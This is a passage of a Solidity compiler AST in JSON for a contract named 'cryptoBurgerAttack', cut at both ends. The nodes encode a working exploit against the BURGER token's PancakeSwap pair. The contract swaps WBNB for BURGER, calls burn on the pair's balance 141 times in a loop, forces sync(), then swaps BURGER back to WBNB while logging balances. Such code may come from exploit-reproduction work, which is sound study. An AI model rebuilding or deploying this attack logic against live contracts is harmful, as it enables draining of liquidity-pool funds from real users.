                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 939,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "9258:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 942,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "9258:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "9243:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 944,
                  "nodeType": "ExpressionStatement",
                  "src": "9243:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 946,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "9382:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 947,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "9388:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 948,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "9396:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 950,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 949,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "9409:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "9396:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 951,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "9413:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 956,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "9432:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 955,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "9424:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 954,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "9424:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 957,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "9424:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 953,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "9416:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 952,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "9416:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 958,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "9416:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 945,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "9375:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 959,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "9375:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 960,
                  "nodeType": "ExpressionStatement",
                  "src": "9375:64:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422042616c616e6365206f6620636f6e74726163742061667465722073776170732e2e2e",
                        "id": 962,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "9507:41:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_67a12627b36476082efb34a668067a3cac50f7ff9ce1c01075b209b5e69efd27",
                          "typeString": "literal_string \"WBNB Balance of contract after swaps...\""
                        },
                        "value": "WBNB Balance of contract after swaps..."
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 967,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "9595:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 966,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "9587:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 965,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "9587:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 968,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "9587:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 963,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "9562:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 964,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "9562:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 969,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "9562:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_67a12627b36476082efb34a668067a3cac50f7ff9ce1c01075b209b5e69efd27",
                          "typeString": "literal_string \"WBNB Balance of contract after swaps...\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 961,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "9490:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 970,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "9490:121:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 971,
                  "nodeType": "EmitStatement",
                  "src": "9485:126:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "486f77206d7563682049206e65656420666f7220616e6f746865722073776170",
                        "id": 973,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "9631:34:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_f44afac1f221fb70878d649ddf748ad21326eec4ff5760d91e8680292b1babf9",
                          "typeString": "literal_string \"How much I need for another swap\""
                        },
                        "value": "How much I need for another swap"
                      },
                      {
                        "baseExpression": {
                          "id": 974,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "9667:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 976,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 975,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "9680:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "9667:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_f44afac1f221fb70878d649ddf748ad21326eec4ff5760d91e8680292b1babf9",
                          "typeString": "literal_string \"How much I need for another swap\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 972,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "9627:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 977,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "9627:56:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 978,
                  "nodeType": "EmitStatement",
                  "src": "9622:61:0"
                },
                {
                  "body": {
                    "id": 998,
                    "nodeType": "Block",
                    "src": "9750:79:0",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 992,
                              "name": "PANCAKE_SWAP_PAIR",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 37,
                              "src": "9786:17:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            {
                              "commonType": {
                                "typeIdentifier": "t_rational_19999000000000000000000_by_1",
                                "typeString": "int_const 19999000000000000000000"
                              },
                              "id": 995,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "leftExpression": {
                                "hexValue": "3139393939",
                                "id": 993,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "kind": "number",
                                "lValueRequested": false,
                                "nodeType": "Literal",
                                "src": "9805:5:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_rational_19999_by_1",
                                  "typeString": "int_const 19999"
                                },
                                "value": "19999"
                              },
                              "nodeType": "BinaryOperation",
                              "operator": "*",
                              "rightExpression": {
                                "hexValue": "31653138",
                                "id": 994,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "kind": "number",
                                "lValueRequested": false,
                                "nodeType": "Literal",
                                "src": "9813:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_rational_1000000000000000000_by_1",
                                  "typeString": "int_const 1000000000000000000"
                                },
                                "value": "1e18"
                              },
                              "src": "9805:12:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_19999000000000000000000_by_1",
                                "typeString": "int_const 19999000000000000000000"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              {
                                "typeIdentifier": "t_rational_19999000000000000000000_by_1",
                                "typeString": "int_const 19999000000000000000000"
                              }
                            ],
                            "expression": {
                              "id": 989,
                              "name": "BURGER_interface",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 58,
                              "src": "9764:16:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IERC20_$1557",
                                "typeString": "contract IERC20"
                              }
                            },
                            "id": 991,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "burn",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 1556,
                            "src": "9764:21:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
                              "typeString": "function (address,uint256) external"
                            }
                          },
                          "id": 996,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "9764:54:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 997,
                        "nodeType": "ExpressionStatement",
                        "src": "9764:54:0"
                      }
                    ]
                  },
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 985,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 983,
                      "name": "i",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 980,
                      "src": "9736:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "<",
                    "rightExpression": {
                      "hexValue": "313431",
                      "id": 984,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "9740:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_141_by_1",
                        "typeString": "int_const 141"
                      },
                      "value": "141"
                    },
                    "src": "9736:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 999,
                  "initializationExpression": {
                    "assignments": [
                      980
                    ],
                    "declarations": [
                      {
                        "constant": false,
                        "id": 980,
                        "mutability": "mutable",
                        "name": "i",
                        "nameLocation": "9729:1:0",
                        "nodeType": "VariableDeclaration",
                        "scope": 999,
                        "src": "9721:9:0",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "typeName": {
                          "id": 979,
                          "name": "uint256",
                          "nodeType": "ElementaryTypeName",
                          "src": "9721:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "id": 982,
                    "initialValue": {
                      "hexValue": "30",
                      "id": 981,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "9733:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_0_by_1",
                        "typeString": "int_const 0"
                      },
                      "value": "0"
                    },
                    "nodeType": "VariableDeclarationStatement",
                    "src": "9721:13:0"
                  },
                  "loopExpression": {
                    "expression": {
                      "id": 987,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "nodeType": "UnaryOperation",
                      "operator": "++",
                      "prefix": false,
                      "src": "9745:3:0",
                      "subExpression": {
                        "id": 986,
                        "name": "i",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 980,
                        "src": "9745:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "id": 988,
                    "nodeType": "ExpressionStatement",
                    "src": "9745:3:0"
                  },
                  "nodeType": "ForStatement",
                  "src": "9716:113:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "425552472062616c616e6365206f66205061636b6167652070616972",
                        "id": 1001,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "9860:30:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_c2f6d831ab405daa3ee8588f7280fc6b53691b14e3743924bc177af7da69d6c4",
                          "typeString": "literal_string \"BURG balance of Package pair\""
                        },
                        "value": "BURG balance of Package pair"
                      },
                      {
                        "arguments": [
                          {
                            "id": 1004,
                            "name": "PANCAKE_SWAP_PAIR",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 37,
                            "src": "9931:17:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1002,
                            "name": "BURGER_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 58,
                            "src": "9904:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1003,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "9904:26:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1005,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "9904:45:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_c2f6d831ab405daa3ee8588f7280fc6b53691b14e3743924bc177af7da69d6c4",
                          "typeString": "literal_string \"BURG balance of Package pair\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 1000,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "9843:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 1006,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "9843:116:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1007,
                  "nodeType": "EmitStatement",
                  "src": "9838:121:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "arguments": [
                          {
                            "id": 1009,
                            "name": "PANCAKE_SWAP_PAIR",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 37,
                            "src": "9982:17:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1008,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1762,
                          "src": "9969:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$1762_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 1010,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "9969:31:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$1762",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 1011,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sync",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1741,
                      "src": "9969:36:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 1012,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "9969:38:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1013,
                  "nodeType": "ExpressionStatement",
                  "src": "9969:38:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1015,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10025:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1016,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10033:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1019,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1017,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10039:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1018,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10047:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10039:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1020,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10053:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1025,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10072:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1024,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10064:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1023,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10064:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1026,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10064:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1022,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10056:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1021,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10056:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1027,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10056:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
